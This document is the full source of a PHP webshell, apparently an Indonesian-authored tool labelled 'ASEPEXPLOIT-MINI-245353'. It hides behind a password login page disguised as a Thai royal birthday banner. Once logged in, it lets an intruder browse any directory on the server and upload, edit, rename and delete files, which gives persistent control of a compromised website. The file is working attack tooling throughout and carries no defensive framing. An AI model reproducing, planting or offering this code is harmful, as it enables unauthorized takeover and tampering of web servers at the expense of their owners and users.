<?php
session_start();

// Add custom header
header("ASEPEXPLOIT-MINI-245353: Active");

// Ganti password di sini
$realpass = "asepexploitsgantengbangetgan";

// Jika belum login
if (!isset($_SESSION['logined'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $realpass) {
        $_SESSION['logined'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
    echo '
    <html><head><title>วันเฉลิมพระชนมพรรษา</title>
    <style>
    body{margin:0;background:#f3e5ab;font-family:sans-serif}
    .banner{position:relative;width:100%;height:100vh;background:url(https://files.catbox.moe/jvqpfx.png) no-repeat center center;background-size:cover;}
    .loginbox{position:absolute;bottom:20px;right:20px;background:rgba(255,255,255,0.85);padding:10px;border-radius:10px;box-shadow:0 0 5px #999}
    input{padding:5px;margin-top:5px;border:1px solid #ccc;border-radius:4px}
    </style>
    </head><body>
    <div class="banner">
        <div class="loginbox">
            <form method="post">
                <div>เข้าสู่ระบบ</div>
                <input type="password" name="pass" placeholder="ใส่รหัสผ่าน"><br>
                <input type="submit" value="Login">
            </form>
        </div>
    </div>
    </body></html>';
    exit;
}

// ✅ Webshell setelah login
// Handle hex path parameter
$path = '';
if (isset($_GET['l'])) {
    $path = hex2bin($_GET['l']);
} elseif (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}

chdir($path);
$current = realpath($path);

// Helper functions for encoding
function path_to_hex($path) {
    return bin2hex($path);
}

function hex_to_path($hex) {
    return hex2bin($hex);
}

function perms($f){
    $p = fileperms($f);
    return ($p & 0x0100 ? 'r' : '-') .
           ($p & 0x0080 ? 'w' : '-') .
           ($p & 0x0040 ? 'x' : '-') .
           ($p & 0x0020 ? 'r' : '-') .
           ($p & 0x0010 ? 'w' : '-') .
           ($p & 0x0008 ? 'x' : '-') .
           ($p & 0x0004 ? 'r' : '-') .
           ($p & 0x0002 ? 'w' : '-') .
           ($p & 0x0001 ? 'x' : '-');
}

function create_breadcrumb($path) {
    $path = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $breadcrumb = '';
    $current_path = '';
    
    foreach ($parts as $i => $part) {
        if (empty($part) && $i == 0) {
            $part = '/';
            $current_path = '/';
        } else {
            $current_path .= ($current_path == '/' ? '' : '/') . $part;
        }
        
        if ($i == count($parts) - 1) {
            $breadcrumb .= '<strong>' . htmlspecialchars($part) . '</strong>';
        } else {
            $breadcrumb .= '<a href="?l=' . path_to_hex($current_path) . '">' . htmlspecialchars($part) . '</a>';
            if ($i < count($parts) - 1) {
                $breadcrumb .= ' / ';
            }
        }
    }
    return $breadcrumb;
}
function list_dir($dir){
    $i = scandir($dir); 
    $d = array(); 
    $f = array();
    foreach ($i as $x) {
        if ($x=='.'||$x=='..') continue;
        is_dir($x) ? array_push($d, $x) : array_push($f, $x);
    }
    return array_merge($d, $f);
}
// Handle file operations
if (isset($_GET['del'])) {
    $t = basename($_GET['del']);
    if (is_file($t)) unlink($t);
    header("Location: ?l=" . path_to_hex($current));
    exit;
}

// Handle file upload
if (isset($_FILES) && !empty($_FILES['file']['name'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    header("Location: ?l=" . path_to_hex($current));
    exit;
}

// Handle file rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $old_name = basename($_POST['rename_from']);
    $new_name = basename($_POST['rename_to']);
    if (file_exists($old_name) && !empty($new_name)) {
        rename($old_name, $new_name);
    }
    header("Location: ?l=" . path_to_hex($current));
    exit;
}

// Handle file edit save
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $filename = basename($_POST['edit_file']);
    file_put_contents($filename, $_POST['file_content']);
    header("Location: ?l=" . path_to_hex($current));
    exit;
}

// Show file edit form
if (isset($_GET['edit'])) {
    $edit_file = basename($_GET['edit']);
    if (is_file($edit_file)) {
        $content = htmlspecialchars(file_get_contents($edit_file));
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Edit File</title><style>
        body{font-family:sans-serif;background:#f4f6f8;margin:0;padding:20px;}
        .header-banner{background:linear-gradient(45deg,#ff6b6b,#4ecdc4);color:white;text-align:center;padding:15px;margin:-20px -20px 20px -20px;font-size:24px;font-weight:bold;text-shadow:2px 2px 4px rgba(0,0,0,0.3);border-bottom:3px solid #333;}
        textarea{width:100%;height:400px;font-family:monospace;font-size:14px;}
        .edit-form{background:#fff;padding:20px;border-radius:5px;}
        .btn{background:#0073aa;color:white;padding:8px 15px;border:none;border-radius:3px;cursor:pointer;margin-right:10px;}
        .btn:hover{background:#005a87;}
        .btn-cancel{background:#666;}
        .footer{background:#333;color:#fff;text-align:center;padding:10px;margin:20px -20px -20px -20px;font-size:12px;border-top:3px solid #666;}
        .footer a{color:#4ecdc4;text-decoration:none;}
        .footer a:hover{color:#ff6b6b;}
        </style></head><body>";
        echo "<div class='header-banner'>🚀 ASEPEXPLOIT-MINI-245353 🚀</div>";
        echo "<div class='edit-form'>";
        echo "<h3>✏️ Edit File: " . htmlspecialchars($edit_file) . "</h3>";
        echo "<form method='post'>";
        echo "<textarea name='file_content'>" . $content . "</textarea><br><br>";
        echo "<input type='hidden' name='edit_file' value='" . htmlspecialchars($edit_file) . "'>";
        echo "<button type='submit' class='btn'>💾 Save</button>";
        echo "<a href='?l=" . path_to_hex($current) . "' class='btn btn-cancel'>❌ Cancel</a>";
        echo "</form></div>";
        echo "<div class='footer'>💻 code by <a href='#'>mr4sep</a> 💻</div>";
        echo "</body></html>";
        exit;
    }
}

echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>dirshell</title><style>
body{font-family:sans-serif;background:#f4f6f8;margin:0;padding:20px;}
h2{margin:0 0 10px}
.header-banner{background:linear-gradient(45deg,#ff6b6b,#4ecdc4);color:white;text-align:center;padding:15px;margin:-20px -20px 20px -20px;font-size:24px;font-weight:bold;text-shadow:2px 2px 4px rgba(0,0,0,0.3);border-bottom:3px solid #333;}
.breadcrumb{background:#fff;padding:10px;border-radius:5px;margin-bottom:10px;border:1px solid #ddd;}
.breadcrumb a{color:#0073aa;text-decoration:none;padding:2px 4px;border-radius:3px;}
.breadcrumb a:hover{background:#e6f3ff;}
table{width:100%;border-collapse:collapse;background:#fff}
th,td{padding:8px;border:1px solid #ddd;font-size:14px}
th{background:#eee;text-align:left}
a{text-decoration:none;color:#0073aa}
form{margin:10px 0}
input[type=file]{margin-right:10px}
.nav-buttons{margin:10px 0;}
.nav-buttons a{background:#0073aa;color:white;padding:5px 10px;text-decoration:none;border-radius:3px;margin-right:5px;}
.nav-buttons a:hover{background:#005a87;}
.action-btn{padding:2px 6px;margin:1px;font-size:11px;border-radius:3px;text-decoration:none;display:inline-block;}
.edit-btn{background:#28a745;color:white;}
.rename-btn{background:#ffc107;color:black;}
.delete-btn{background:#dc3545;color:white;}
.action-btn:hover{opacity:0.8;}
.rename-form{display:none;background:#fff3cd;padding:5px;border-radius:3px;margin-top:5px;}
.rename-input{width:150px;padding:2px;border:1px solid #ccc;border-radius:2px;}
.rename-submit{background:#007bff;color:white;border:none;padding:2px 8px;border-radius:2px;cursor:pointer;}
.footer{background:#333;color:#fff;text-align:center;padding:10px;margin:20px -20px -20px -20px;font-size:12px;border-top:3px solid #666;}
.footer a{color:#4ecdc4;text-decoration:none;}
.footer a:hover{color:#ff6b6b;}
</style>
<script>
function showRename(filename) {
    var form = document.getElementById('rename-' + filename);
    if (form.style.display === 'none' || form.style.display === '') {
        form.style.display = 'block';
        document.getElementById('rename-input-' + filename).focus();
        document.getElementById('rename-input-' + filename).select();
    } else {
        form.style.display = 'none';
    }
}
</script>
</head><body>";

echo "<div class='header-banner'>ASEPEXPLOIT-MINI-245353</div>";

echo "<div class='breadcrumb'>📁 " . create_breadcrumb($current) . "</div>";

// Tombol navigasi
$parent_dir = dirname($current);
if ($parent_dir != $current) {
    echo "<div class='nav-buttons'><a href='?l=" . path_to_hex($parent_dir) . "'>⬅ Back to Parent Directory</a></div>";
}
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='file'><input type='submit' value='Upload'></form>";

echo "<table><tr><th>Name</th><th>Perm</th><th>Modified</th><th>Size</th><th>Type</th><th>Action</th></tr>";

foreach (list_dir('.') as $x) {
    $full = realpath($x);
    $is_dir = is_dir($x);
    $perm = perms($x);
    $mod = date("Y-m-d H:i", filemtime($x));
    $size = $is_dir ? '-' : number_format(filesize($x)/1024,2).' KB';
    $ext = $is_dir ? '' : pathinfo($x, PATHINFO_EXTENSION);
    $type = $is_dir ? 'Folder' : ($ext ? $ext.' file' : 'file');
    $safe_filename = htmlspecialchars($x);
    echo "<tr>";
    echo "<td>".($is_dir?"📁 <a href='?l=".path_to_hex($full)."'>".$safe_filename."</a>":"📄 ".$safe_filename)."</td>";
    echo "<td>$perm</td><td>$mod</td><td>$size</td><td>$type</td>";
    echo "<td>";
    if (!$is_dir) {
        echo "<a href='?l=".path_to_hex($current)."&edit=".urlencode($x)."' class='action-btn edit-btn'>✏️ Edit</a> ";
        echo "<a href='javascript:void(0)' onclick='showRename(\"".addslashes($x)."\")' class='action-btn rename-btn'>📝 Rename</a> ";
        echo "<a href='?l=".path_to_hex($current)."&del=".urlencode($x)."' onclick='return confirm(\"Delete $safe_filename?\")' class='action-btn delete-btn'>🗑️ Delete</a>";
        echo "<div id='rename-".addslashes($x)."' class='rename-form'>";
        echo "<form method='post' style='margin:0;'>";
        echo "<input type='hidden' name='rename_from' value='".$safe_filename."'>";
        echo "<input type='text' name='rename_to' value='".$safe_filename."' class='rename-input' id='rename-input-".addslashes($x)."'>";
        echo "<button type='submit' class='rename-submit'>✓</button>";
        echo "</form></div>";
    } else {
        echo "<a href='javascript:void(0)' onclick='showRename(\"".addslashes($x)."\")' class='action-btn rename-btn'>📝 Rename</a>";
        echo "<div id='rename-".addslashes($x)."' class='rename-form'>";
        echo "<form method='post' style='margin:0;'>";
        echo "<input type='hidden' name='rename_from' value='".$safe_filename."'>";
        echo "<input type='text' name='rename_to' value='".$safe_filename."' class='rename-input' id='rename-input-".addslashes($x)."'>";
        echo "<button type='submit' class='rename-submit'>✓</button>";
        echo "</form></div>";
    }
    echo "</td>";
    echo "</tr>";
}
echo "</table>";
echo "<div class='footer'>code by <a href='#'>mr4sep</a></div>";
echo "</body></html>";
